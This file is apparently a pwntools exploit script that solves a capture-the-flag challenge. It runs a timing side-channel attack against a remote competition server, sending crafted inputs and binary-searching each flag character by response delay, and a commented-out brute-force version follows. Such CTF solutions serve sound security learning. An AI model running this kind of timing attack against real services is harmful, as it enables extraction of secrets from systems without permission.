from pwn import *
import sys
from time import time
import binascii

from IPython import embed

context.update(endian='big')

flag = "CTF"

def get_delay(x, hi):
    a = 0
    for _ in range(1):
        a += get_delay2(x,hi)
    return a

def get_delay2(x, hi): # takes longer when guessed val < actual
    global flag
    # s = remote('localhost', 1337)
    s = remote('tracing.2020.ctfcompetition.com', 1337)
    lo = flag
    # hi = flag
    lo += chr(x)
    # hi += chr(x+1)
    # print(f"curr char: {lo}")
    lo = lo.ljust(16, "!")
    # hi = hi.ljust(16, "!")
    s.send(lo)
    # s.send(hi)

    # highest = hex(x)[2:] + "ffffffffffffffffffffffffffffffff"
    # m = hex(hi)[2:]*16
    # m = binascii.hexlify(bytes(flag,'ascii'))
    # while len(m) < 32:
    #     m += bytes(hex(hi)[2:], 'ascii')
    m = "ff"*16
    # print(m)
    # hlo = binascii.hexlify(bytes(m, "ascii"))
    for i in range(10000):
        s.send((int(m,16) - i).to_bytes(16, 'big'))
        # s.send((int(highest,16) - i).to_bytes(16, 'big'))
    s.shutdown('send')
    try:
        print(u32(s.recv(4)))
        t0 = time()
        s.recv()
    except:
        try:
            test = t0
        except:
            t0 = time()
        print("conn closed")
    t1 = time()
    delay = t1 - t0
    print(delay)
    return delay


# for l in range(16):
best = 0

# lo_delay = get_delay(lo)
# hi_delay = get_delay(hi)

for i in range(16):
    lo = 0x21
    hi = 0x7f
    while lo <= hi:
        mid = (lo + hi) // 2
        hi_delay = get_delay(0,hi-1)
        print(f"hi val is: {(hi)}")
        print(f"lo val is: {(lo)}")
        print(f"mid val is: {(mid)}")
        print(f"flag: {flag + chr(mid)}")

        if (get_delay(mid,hi-1) + min(hi_delay - 0.2, 0.1)< hi_delay):
            hi = mid
        else:
            lo = mid + 1
    print("-------------------------")
    print(chr(mid))
    flag += chr(mid)

    # for x in range(0x21, 0x7f):
    #     s = remote('localhost', 1337)
    #     # s = remote('tracing.2020.ctfcompetition.com', 1337)
    #     lo = flag
    #     hi = flag
    #     lo += chr(x)
    #     hi += chr(x+1)
    #     print(f"curr char: {lo}")
    #     lo = lo.ljust(16, "!")
    #     hi = hi.ljust(16, "!")
    #     s.send(lo)
    #     s.send(hi)

    #     # highest = hex(x)[2:] + "ffffffffffffffffffffffffffffffff"
    #     hlo = binascii.hexlify(bytes(lo, "ascii"))
    #     for i in range(2000):
    #         s.send((int(hlo,16) + i).to_bytes(16, 'big'))
    #         # s.send((int(highest,16) - i).to_bytes(16, 'big'))
    #     t0 = time()
    #     s.shutdown('send')
    #     print(u32(s.recv(4)))
    #     try:
    #         s.recv()
    #     except:
    #         print("conn closed")
    #     t1 = time()
    #     delay = t1 - t0
    #     if delay > best:
    #         best = delay
    #         bestc = chr(x)
    #     print(f"delay: {t1 - t0}")
    # flag += bestc
    # print(f"flag: {flag}")
    # embed()
